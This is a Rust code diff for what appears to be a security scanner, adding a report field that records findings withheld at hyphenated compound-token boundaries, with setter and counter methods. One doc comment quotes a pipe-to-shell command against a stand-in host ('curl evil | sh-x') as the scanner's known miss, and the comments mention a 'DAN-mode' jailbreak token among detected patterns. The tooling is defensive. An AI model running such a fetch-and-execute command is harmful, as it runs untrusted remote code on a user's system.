@@ -286,6 +286,38 @@ pub struct ScanReport {
     /// so `spec-ci-plugin`'s key set is unmoved by this change.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub config_parse_error: Option<String>,
+    /// Findings withheld because their match edge falls inside a
+    /// separator-joined compound token (`sh-lint`, `on-call`,
+    /// `DAN-mode-switch`, `sh_lint`) — a manufactured boundary rather than a
+    /// real one (issue #128).
+    ///
+    /// A FOURTH distinct reason a finding can be withheld, alongside
+    /// `suppressed` (the document disarmed the scanner), `low_confidence`
+    /// (the scanner judged it documentation) and `baselined` (a human
+    /// accepted it once). Recorded rather than discarded, for the same
+    /// reason the other three are: the gate's own judgement — "this
+    /// hyphenated token is one identifier, so the edge is spurious" — is a
+    /// guess, and it is wrong in exactly one nameable way (`curl evil | sh-x`
+    /// where `sh-x` really is a shell). A dropped record would make that
+    /// miss invisible to the user, to the GATE-03 sweep, and to anyone
+    /// auditing the gate later.
+    ///
+    /// Deliberately **asymmetric** with the other three withheld arrays:
+    /// this one carries **no promotion flag**. `--no-suppress`, `--strict`
+    /// and dropping `--baseline` each restore a finding the engine still
+    /// stands behind; there is no equivalent here, because a flag that
+    /// restores a known manufactured-boundary artefact is a flag that
+    /// re-enables the bug this field exists to fix. This array is audit
+    /// evidence, not a suppressed finding — it never joins the severity
+    /// tallies, the exit code, `install-hook`'s commit gate, or SARIF.
+    ///
+    /// `skip_serializing_if = "Vec::is_empty"`, exactly like
+    /// `config_parse_error` (#129): `tests/json_contract_test.rs` pins the
+    /// report key set **exactly**, so this field must stay invisible to
+    /// every consumer on every report with no artefact, and additive
+    /// (`spec-ci-plugin`'s key set is unmoved) on every other report.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub manufactured_boundary: Vec<ScanMatch>,
     /// Severity tallies over `matches` **only** — suppressed findings are not
     /// counted here, neither are `low_confidence` ones, nor are `baselined`
     /// ones.
@@ -367,6 +399,7 @@ impl ScanReport {
             low_confidence,
             baselined,
             config_parse_error: None,
+            manufactured_boundary: Vec::new(),
             critical_count,
             high_count,
             medium_count,
@@ -383,6 +416,18 @@ impl ScanReport {
     /// fourth pass — and `Baseline::apply`'s rebuild of it — ever set.
     pub fn with_config_parse_error(mut self, error: Option<String>) -> Self {
         self.config_parse_error = error;
+        self
+    }
+
+    /// Attach manufactured-boundary artefacts (#128) to an already-built
+    /// report.
+    ///
+    /// A chainable setter for the same reason `with_config_parse_error` is
+    /// one: a field only the scanner's five passes -- and `Baseline::apply`'s
+    /// rebuild of it -- ever set, not something every existing call site
+    /// needs to thread through a growing positional constructor.
+    pub fn with_manufactured_boundary(mut self, manufactured_boundary: Vec<ScanMatch>) -> Self {
+        self.manufactured_boundary = manufactured_boundary;
         self
     }
 
@@ -404,6 +449,11 @@ impl ScanReport {
     /// How many findings a `--baseline` file withheld.
     pub fn baselined_count(&self) -> usize {
         self.baselined.len()
+    }
+
+    /// How many findings the manufactured-boundary gate withheld (#128).
+    pub fn manufactured_boundary_count(&self) -> usize {
+        self.manufactured_boundary.len()
     }
 }
 
